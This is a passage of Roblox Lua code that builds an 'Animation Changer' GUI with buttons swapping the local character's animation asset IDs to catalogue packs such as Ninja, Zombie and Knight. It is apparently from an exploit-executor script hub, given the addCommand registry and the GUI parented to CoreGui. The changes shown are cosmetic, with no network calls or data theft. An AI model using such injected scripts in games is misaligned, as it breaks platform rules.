			A_Anthro.Text = "Anthro (Default)"
			A_Anthro.TextColor3 = Color3.new(1, 1, 1)
			A_Anthro.TextSize = 20
			A_Anthro.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Main:TweenPosition(UDim2.new(0.421999991, 0, 0.28400004, 0))
		end;
	});

	addCommand({
		["Name"] = "animationchanger";
		["Function"] = function()
			local AnimationChanger = Instance.new("ScreenGui")
			local Main = Instance.new("Frame")
			local TopBar = Instance.new("Frame")
			local Close = Instance.new("TextButton")
			local TextLabel = Instance.new("TextLabel")
			local TextLabel_2 = Instance.new("TextLabel")
			local NormalTab = Instance.new("Frame")
			local A_Astronaut = Instance.new("TextButton")
			local A_Bubbly = Instance.new("TextButton")
			local A_Cartoony = Instance.new("TextButton")
			local A_Elder = Instance.new("TextButton")
			local A_Knight = Instance.new("TextButton")
			local A_Levitation = Instance.new("TextButton")
			local A_Mage = Instance.new("TextButton")
			local A_Ninja = Instance.new("TextButton")
			local A_Pirate = Instance.new("TextButton")
			local A_Robot = Instance.new("TextButton")
			local A_Stylish = Instance.new("TextButton")
			local A_SuperHero = Instance.new("TextButton")
			local A_Toy = Instance.new("TextButton")
			local A_Vampire = Instance.new("TextButton")
			local A_Werewolf = Instance.new("TextButton")
			local A_Zombie = Instance.new("TextButton")
			local Category = Instance.new("TextLabel")
			local SpecialTab = Instance.new("Frame")
			local A_Patrol = Instance.new("TextButton")
			local A_Confident = Instance.new("TextButton")
			local A_Popstar = Instance.new("TextButton")
			local A_Cowboy = Instance.new("TextButton")
			local A_Ghost = Instance.new("TextButton")
			local A_Sneaky = Instance.new("TextButton")
			local A_Princess = Instance.new("TextButton")
			local Category_2 = Instance.new("TextLabel")
			local OtherTab = Instance.new("Frame")
			local Category_3 = Instance.new("TextLabel")
			local A_None = Instance.new("TextButton")
			local A_Anthro = Instance.new("TextButton")

			AnimationChanger.Name = "AnimationChanger"
			AnimationChanger.Parent = game:WaitForChild("CoreGui")
			AnimationChanger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

			Main.Name = "Main"
			Main.Parent = AnimationChanger
			Main.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			Main.BorderSizePixel = 0
			Main.Position = UDim2.new(0.421999991, 0, -1, 0)
			Main.Size = UDim2.new(0, 300, 0, 250)
			Main.Active = true
			Main.Draggable = true

			TopBar.Name = "TopBar"
			TopBar.Parent = Main
			TopBar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			TopBar.BorderSizePixel = 0
			TopBar.Size = UDim2.new(0, 300, 0, 30)

			Close.Name = "Close"
			Close.Parent = TopBar
			Close.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			Close.BorderSizePixel = 0
			Close.Position = UDim2.new(0.899999976, 0, 0, 0)
			Close.Size = UDim2.new(0, 30, 0, 30)
			Close.Font = Enum.Font.SciFi
			Close.Text = "x"
			Close.TextColor3 = Color3.new(1, 0, 0.0156863)
			Close.TextSize = 20
			Close.MouseButton1Click:Connect(function()
				wait(0.3)
				Main:TweenPosition(UDim2.new(0.421999991, 0, -1.28400004, 0))
				wait(3)
				AnimationChanger:Destroy()
			end)

			TextLabel.Parent = TopBar
			TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0, 0, 0.600000024, 0)
			TextLabel.Size = UDim2.new(0, 270, 0, 10)
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.Text = "Fixed by Compwnter#5640"
			TextLabel.TextColor3 = Color3.new(1, 1, 1)
			TextLabel.TextSize = 15

			TextLabel_2.Parent = TopBar
			TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
			TextLabel_2.BackgroundTransparency = 1
			TextLabel_2.BorderSizePixel = 0
			TextLabel_2.Position = UDim2.new(0, 0, -0.0266667679, 0)
			TextLabel_2.Size = UDim2.new(0, 270, 0, 20)
			TextLabel_2.Font = Enum.Font.SourceSans
			TextLabel_2.Text = "Animation Changer"
			TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
			TextLabel_2.TextSize = 20

			NormalTab.Name = "NormalTab"
			NormalTab.Parent = Main
			NormalTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			NormalTab.BackgroundTransparency = 1
			NormalTab.BorderSizePixel = 0
			NormalTab.Position = UDim2.new(0.5, 0, 0.119999997, 0)
			NormalTab.Size = UDim2.new(0, 150, 0, 500)

			A_Astronaut.Name = "A_Astronaut"
			A_Astronaut.Parent = NormalTab
			A_Astronaut.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Astronaut.BorderSizePixel = 0
			A_Astronaut.Position = UDim2.new(0, 0, 0.815764725, 0)
			A_Astronaut.Size = UDim2.new(0, 150, 0, 30)
			A_Astronaut.Font = Enum.Font.SciFi
			A_Astronaut.Text = "Astronaut"
			A_Astronaut.TextColor3 = Color3.new(1, 1, 1)
			A_Astronaut.TextSize = 20
			A_Astronaut.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Bubbly.Name = "A_Bubbly"
			A_Bubbly.Parent = NormalTab
			A_Bubbly.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Bubbly.BorderSizePixel = 0
			A_Bubbly.Position = UDim2.new(0, 0, 0.349019617, 0)
			A_Bubbly.Size = UDim2.new(0, 150, 0, 30)
			A_Bubbly.Font = Enum.Font.SciFi
			A_Bubbly.Text = "Bubbly"
			A_Bubbly.TextColor3 = Color3.new(1, 1, 1)
			A_Bubbly.TextSize = 20
			A_Bubbly.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Cartoony.Name = "A_Cartoony"
			A_Cartoony.Parent = NormalTab
			A_Cartoony.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Cartoony.BorderSizePixel = 0
			A_Cartoony.Position = UDim2.new(0, 0, 0.407272667, 0)
			A_Cartoony.Size = UDim2.new(0, 150, 0, 30)
			A_Cartoony.Font = Enum.Font.SciFi
			A_Cartoony.Text = "Cartoony"
			A_Cartoony.TextColor3 = Color3.new(1, 1, 1)
			A_Cartoony.TextSize = 20
			A_Cartoony.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Elder.Name = "A_Elder"
			A_Elder.Parent = NormalTab
			A_Elder.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Elder.BorderSizePixel = 0
			A_Elder.Position = UDim2.new(6.51925802e-09, 0, 0.636310041, 0)
			A_Elder.Size = UDim2.new(0, 150, 0, 30)
			A_Elder.Font = Enum.Font.SciFi
			A_Elder.Text = "Elder"
			A_Elder.TextColor3 = Color3.new(1, 1, 1)
			A_Elder.TextSize = 20
			A_Elder.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Knight.Name = "A_Knight"
			A_Knight.Parent = NormalTab
			A_Knight.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Knight.BorderSizePixel = 0
			A_Knight.Position = UDim2.new(0, 0, 0.52352941, 0)
			A_Knight.Size = UDim2.new(0, 150, 0, 30)
			A_Knight.Font = Enum.Font.SciFi
			A_Knight.Text = "Knight"
			A_Knight.TextColor3 = Color3.new(1, 1, 1)
			A_Knight.TextSize = 20
			A_Knight.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Levitation.Name = "A_Levitation"
			A_Levitation.Parent = NormalTab
			A_Levitation.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Levitation.BorderSizePixel = 0
			A_Levitation.Position = UDim2.new(0, 0, 0.115472436, 0)
			A_Levitation.Size = UDim2.new(0, 150, 0, 30)
			A_Levitation.Font = Enum.Font.SciFi
			A_Levitation.Text = "Levitation"
			A_Levitation.TextColor3 = Color3.new(1, 1, 1)
			A_Levitation.TextSize = 20
			A_Levitation.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Mage.Name = "A_Mage"
			A_Mage.Parent = NormalTab
			A_Mage.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Mage.BorderSizePixel = 0
			A_Mage.Position = UDim2.new(0, 0, 0.696203232, 0)
			A_Mage.Size = UDim2.new(0, 150, 0, 30)
			A_Mage.Font = Enum.Font.SciFi
			A_Mage.Text = "Mage"
			A_Mage.TextColor3 = Color3.new(1, 1, 1)
			A_Mage.TextSize = 20
			A_Mage.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Ninja.Name = "A_Ninja"
			A_Ninja.Parent = NormalTab
			A_Ninja.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Ninja.BorderSizePixel = 0
			A_Ninja.Position = UDim2.new(0, 0, 0.0597896464, 0)
			A_Ninja.Size = UDim2.new(0, 150, 0, 30)
			A_Ninja.Font = Enum.Font.SciFi
			A_Ninja.Text = "Ninja"
			A_Ninja.TextColor3 = Color3.new(1, 1, 1)
			A_Ninja.TextSize = 20
			A_Ninja.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Pirate.Name = "A_Pirate"
			A_Pirate.Parent = NormalTab
			A_Pirate.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Pirate.BorderSizePixel = 0
			A_Pirate.Position = UDim2.new(-0.000333309174, 0, 0.874588311, 0)
			A_Pirate.Size = UDim2.new(0, 150, 0, 30)
			A_Pirate.Font = Enum.Font.SciFi
			A_Pirate.Text = "Pirate"
			A_Pirate.TextColor3 = Color3.new(1, 1, 1)
			A_Pirate.TextSize = 20
			A_Pirate.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Robot.Name = "A_Robot"
			A_Robot.Parent = NormalTab
			A_Robot.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Robot.BorderSizePixel = 0
			A_Robot.Position = UDim2.new(0, 0, 0.291479498, 0)
			A_Robot.Size = UDim2.new(0, 150, 0, 30)
			A_Robot.Font = Enum.Font.SciFi
			A_Robot.Text = "Robot"
			A_Robot.TextColor3 = Color3.new(1, 1, 1)
			A_Robot.TextSize = 20
			A_Robot.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Stylish.Name = "A_Stylish"
			A_Stylish.Parent = NormalTab
			A_Stylish.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Stylish.BorderSizePixel = 0
			A_Stylish.Position = UDim2.new(0, 0, 0.232816339, 0)
			A_Stylish.Size = UDim2.new(0, 150, 0, 30)
			A_Stylish.Font = Enum.Font.SciFi
			A_Stylish.Text = "Stylish"
			A_Stylish.TextColor3 = Color3.new(1, 1, 1)
			A_Stylish.TextSize = 20
			A_Stylish.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_SuperHero.Name = "A_SuperHero"
			A_SuperHero.Parent = NormalTab
			A_SuperHero.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_SuperHero.BorderSizePixel = 0
			A_SuperHero.Position = UDim2.new(0, 0, 0.464919746, 0)
			A_SuperHero.Size = UDim2.new(0, 150, 0, 30)
			A_SuperHero.Font = Enum.Font.SciFi
			A_SuperHero.Text = "SuperHero"
			A_SuperHero.TextColor3 = Color3.new(1, 1, 1)
			A_SuperHero.TextSize = 20
			A_SuperHero.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Toy.Name = "A_Toy"
			A_Toy.Parent = NormalTab
			A_Toy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Toy.BorderSizePixel = 0
			A_Toy.Position = UDim2.new(6.51925802e-09, 0, 0.756028414, 0)
			A_Toy.Size = UDim2.new(0, 150, 0, 30)
			A_Toy.Font = Enum.Font.SciFi
			A_Toy.Text = "Toy"
			A_Toy.TextColor3 = Color3.new(1, 1, 1)
			A_Toy.TextSize = 20
			A_Toy.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Vampire.Name = "A_Vampire"
			A_Vampire.Parent = NormalTab
			A_Vampire.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Vampire.BorderSizePixel = 0
			A_Vampire.Position = UDim2.new(0, 0, 0.934021354, 0)
			A_Vampire.Size = UDim2.new(0, 150, 0, 30)
			A_Vampire.Font = Enum.Font.SciFi
			A_Vampire.Text = "Vampire"
			A_Vampire.TextColor3 = Color3.new(1, 1, 1)
			A_Vampire.TextSize = 20
			A_Vampire.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Werewolf.Name = "A_Werewolf"
			A_Werewolf.Parent = NormalTab
			A_Werewolf.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Werewolf.BorderSizePixel = 0
			A_Werewolf.Position = UDim2.new(-0.000333368778, 0, 0.174509808, 0)
			A_Werewolf.Size = UDim2.new(0, 150, 0, 30)
			A_Werewolf.Font = Enum.Font.SciFi
			A_Werewolf.Text = "Werewolf"
			A_Werewolf.TextColor3 = Color3.new(1, 1, 1)
			A_Werewolf.TextSize = 20
			A_Werewolf.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Zombie.Name = "A_Zombie"
			A_Zombie.Parent = NormalTab
			A_Zombie.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Zombie.BorderSizePixel = 0
			A_Zombie.Position = UDim2.new(-1.1920929e-07, 0, 0.582352936, 0)
			A_Zombie.Size = UDim2.new(0, 150, 0, 30)
			A_Zombie.Font = Enum.Font.SciFi
			A_Zombie.Text = "Zombie"
			A_Zombie.TextColor3 = Color3.new(1, 1, 1)
			A_Zombie.TextSize = 20
			A_Zombie.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Category.Name = "Category"
			Category.Parent = NormalTab
			Category.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category.BorderSizePixel = 0
			Category.Size = UDim2.new(0, 150, 0, 30)
			Category.Text = "Normal"
			Category.TextColor3 = Color3.new(0, 0.835294, 1)
			Category.TextSize = 14

			SpecialTab.Name = "SpecialTab"
			SpecialTab.Parent = Main
			SpecialTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			SpecialTab.BackgroundTransparency = 1
			SpecialTab.BorderSizePixel = 0
			SpecialTab.Position = UDim2.new(0, 0, 0.119999997, 0)
			SpecialTab.Size = UDim2.new(0, 150, 0, 230)

			A_Patrol.Name = "A_Patrol"
			A_Patrol.Parent = SpecialTab
			A_Patrol.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Patrol.BorderSizePixel = 0
			A_Patrol.Position = UDim2.new(0, 0, 0.259960413, 0)
			A_Patrol.Size = UDim2.new(0, 150, 0, 30)
			A_Patrol.Font = Enum.Font.SciFi
			A_Patrol.Text = "Patrol"
			A_Patrol.TextColor3 = Color3.new(1, 1, 1)
			A_Patrol.TextSize = 20
			A_Patrol.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
